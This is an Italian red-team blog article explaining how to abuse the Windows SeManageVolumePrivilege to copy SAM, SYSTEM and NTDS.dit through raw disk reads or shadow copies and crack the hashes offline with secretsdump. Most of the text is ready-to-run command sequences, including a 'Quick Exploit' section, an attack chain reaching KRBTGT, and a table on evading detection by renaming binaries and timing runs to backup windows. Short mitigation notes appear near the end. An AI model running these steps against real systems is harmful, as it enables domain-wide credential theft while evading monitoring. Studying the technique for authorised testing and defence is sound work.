---
title: 'SeManageVolumePrivilege: Raw Disk per SAM e NTDS.dit senza lock'
slug: semanagevolumeprivilege
description: 'Come usare SeManageVolumePrivilege e RawCopy per estrarre SAM, SYSTEM e NTDS.dit dal disco fisico, bypassando lock ed ACL. Tecnica Red Team con raw device access.'
image: /SeManageVolumePrivilege.webp
draft: true
date: 2026-06-12T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - semanagevolumeprivilege
  - raw-disk-access
  - credential-dump
---

`reg save` è monitorato, Backup Operators è hardened, ma hai SeManageVolumePrivilege. Con RawCopy leggi i settori fisici del disco bypassando lock e ACL — SAM, SYSTEM e NTDS.dit estratti direttamente, zero API di filesystem coinvolte.

***

## Quick Exploit

```cmd
manage-bde -status C:
```

Se `Protection Off` → BitLocker assente → procedi:

```cmd
RawCopy.exe /FileNamePath:C:\Windows\System32\config\SAM /OutputPath:C:\temp
RawCopy.exe /FileNamePath:C:\Windows\System32\config\SYSTEM /OutputPath:C:\temp
```

Su macchina attaccante:

```bash
python3 secretsdump.py -sam sam -system system LOCAL
```

***

## Attack Chain

```
Account servizio backup/storage compromesso
  → manage-bde -status C: → BitLocker Off
  → RawCopy.exe → SAM + SYSTEM → C:\temp\
  → secretsdump LOCAL → hash NTLM locali
  OPPURE
  → RawCopy.exe → ntds.dit + SYSTEM (su DC)
  → secretsdump LOCAL → tutti gli hash AD → KRBTGT
```

***

## Tool Decision

| Obiettivo          | Comando                                                                                                       |
| ------------------ | ------------------------------------------------------------------------------------------------------------- |
| SAM/SYSTEM locali  | `RawCopy.exe /FileNamePath:C:\Windows\System32\config\SAM`                                                    |
| NTDS.dit su DC     | `RawCopy.exe /FileNamePath:C:\Windows\NTDS\ntds.dit`                                                          |
| Escalation diretta | `SeManageVolumeExploit.exe` — [CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) |
| Shadow copy + raw  | `vssadmin create shadow /for=C:` → copia dal path VSS                                                         |

***

## Cos'è SeManageVolumePrivilege

Permette di aprire un volume fisico come raw device tramite `\\.\C:` o `\\.\PhysicalDrive0`. Con accesso raw leggi direttamente i settori del disco — i lock del sistema operativo e le ACL NTFS non si applicano a questo livello. Stesso risultato di SeBackupPrivilege, meccanismo completamente diverso e meno monitorato.

**Attenzione:** Se BitLocker è attivo sul volume, i settori letti sono cifrati → dati inutilizzabili senza la chiave di decifrazione.

***

## Quando esiste

* **Administrators** (token elevato)
* **Account di servizio Veeam / Acronis / NetBackup** — richiedono accesso di gestione volume
* **Storage management tools** — monitoring disco, defrag, analisi
* **Account con policy custom** per operazioni di storage

Verifica:

```cmd
whoami /priv
```

Cerchi:

```
SeManageVolumePrivilege    Manage the files on a volume    Enabled
```

Chi ha il privilegio nel sistema:

```cmd
accesschk.exe -a SeManageVolumePrivilege *
```

***

## Step 1 — Verifica BitLocker sul volume target

Prima di procedere, verifica che il volume non sia cifrato:

```cmd
manage-bde -status C:
```

Se lo stato è `Protection On` → BitLocker attivo → i dati raw sono cifrati → questo vettore non è praticabile.

***

## Step 2 — Exploit con SeManageVolumeExploit

Usa `FSCTL_SD_GLOBAL_CHANGE` per manipolare il security descriptor del volume e ottenere write access su file di sistema. Scaricabile da [CsEnox/SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit):

```cmd
SeManageVolumeExploit.exe
```

***

## Step 3 — Estrazione SAM/SYSTEM con RawCopy

**RawCopy** legge i file a livello di settore fisico, parsificando NTFS internamente. Non dipende dalle API di filesystem — bypassa lock e ACL:

```cmd
RawCopy.exe /FileNamePath:C:\Windows\System32\config\SAM /OutputPath:C:\temp
```

```cmd
RawCopy.exe /FileNamePath:C:\Windows\System32\config\SYSTEM /OutputPath:C:\temp
```

```cmd
RawCopy.exe /FileNamePath:C:\Windows\System32\config\SECURITY /OutputPath:C:\temp
```

Poi estrai gli hash offline:

```bash
python3 secretsdump.py -sam sam -system system -security security LOCAL
```

***

## Varianti

### NTDS.dit su DC tramite raw access

NTDS.dit è locked in esecuzione, ma RawCopy legge a livello di settore bypassando il lock:

```cmd
RawCopy.exe /FileNamePath:C:\Windows\NTDS\ntds.dit /OutputPath:C:\temp
```

```cmd
RawCopy.exe /FileNamePath:C:\Windows\System32\config\SYSTEM /OutputPath:C:\temp
```

Poi extraction completa del dominio:

```bash
python3 secretsdump.py -ntds ntds.dit -system system LOCAL
```

### Volume Shadow Copy + raw access

Con SeManageVolumePrivilege puoi anche creare shadow copy e accedere ai file tramite il path VSS:

```cmd
vssadmin create shadow /for=C:
```

L'output mostra il path della shadow copy, ad esempio:

```
Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Poi copia direttamente:

```cmd
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\temp\sam
```

```cmd
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\temp\system
```

### PowerShell — raw volume read

Apri il volume come stream raw:

```powershell
$stream = [System.IO.File]::Open("\\.\C:", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
$buffer = New-Object byte[] 512
$stream.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
$bytesRead = $stream.Read($buffer, 0, 512)
$stream.Close()
```

Questo approccio richiede un NTFS parser custom per estrarre file specifici dagli offset — usa RawCopy che lo gestisce internamente.

***

## Scenari reali

**Software di backup con account di servizio** — Veeam, NetBackup, Acronis richiedono accesso di gestione volume. Se il service account è compromesso, RawCopy estrae SAM e SYSTEM direttamente senza passare dalle API monitorate.

**Alternativa a reg save in ambienti monitorati** — `reg save` genera event ID ben conosciuti. Il raw disk access è un pattern meno comune in molti SIEM e EDR.

***

## Errori comuni

**BitLocker attivo → raw read restituisce dati cifrati** — Verifica SEMPRE prima: `manage-bde -status C:`. Se `Protection On` → questo vettore non è praticabile.

**`\\.\C:` → Access Denied** — Privilegio non Enabled nel token. Verifica: `whoami /priv | findstr SeManageVolume`.

**secretsdump non riesce a decifrare** — SAM e SYSTEM estratti in momenti diversi (boot key cambia). Ri-estrai entrambi nello stesso momento con due comandi RawCopy consecutivi.

**RawCopy su NTDS.dit restituisce file corrotto** — Prova via shadow copy invece: `vssadmin create shadow /for=C:` poi copia dall'output VSS path.

***

## Detection e bypass (Red Team view)

| Cosa rileva il Blue Team                                     | Come lo bypassa il Red Team                                       |
| ------------------------------------------------------------ | ----------------------------------------------------------------- |
| Event ID 4656 — handle su `\\.\C:` da processo non di backup | Esegui durante la finestra oraria del backup legittimo schedulato |
| RawCopy.exe — nome processo anomalo                          | Rinomina il binary prima di caricarlo sul target                  |
| vssadmin create shadow fuori orario                          | Usa RawCopy direttamente invece di passare per VSS                |

***

## Quando fallisce

* **BitLocker attivo** → raw read inutilizzabile — unica mitigazione davvero efficace
* **Privilegio non Enabled** → `\\.\C:` Access Denied
* NTDS.dit corrotto da RawCopy → usa vssadmin + copia dal path shadow

***

## Mitigazioni

* **BitLocker su tutti i volumi critici** — rende completamente inutilizzabile il raw access
* Rimuovere SeManageVolumePrivilege dagli account non necessari
* Monitorare Event ID 4656 con ObjectType = Volume da account non standard
* gMSA per i service account di backup

**Nota realistica:** BitLocker non è sempre deployato sui server, specialmente su macchine enterprise legacy. Nei pentest, `manage-bde -status` è uno dei primi comandi da eseguire dopo aver verificato il privilegio.

***

## FAQ

**Perché usarlo invece di SeBackupPrivilege?**
Quando SeBackupPrivilege è rimosso o `reg save` è monitorato. Il raw disk access è un pattern meno comune in molti SIEM e ruleset EDR.

**RawCopy gestisce il parsing NTFS automaticamente?**
Sì — specifica il path Windows normale, RawCopy calcola l'offset nel disco internamente.

***

SeManageVolumePrivilege è il vettore di credential dump alternativo quando i metodi standard sono monitorati — BitLocker è l'unica mitigazione che lo rende inutilizzabile.

***

**Articoli correlati:**

* [SeBackupPrivilege](https://hackita.it/articoli/sebackupprivilege) — stesso risultato, API di filesystem invece di raw disk
* [SeDebugPrivilege](https://hackita.it/articoli/sedebugprivilege) — dump LSASS da memoria, non tocca il disco

**Riferimenti:** [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-the-files-on-a-volume)

Per assessment della surface di backup e storage: [hackita.it/servizi](https://hackita.it/servizi)
**Riferimenti:** [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) · [Microsoft Docs](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-the-files-on-a-volume)

Per assessment della surface di backup e storage: [hackita.it/servizi](https://hackita.it/servizi)
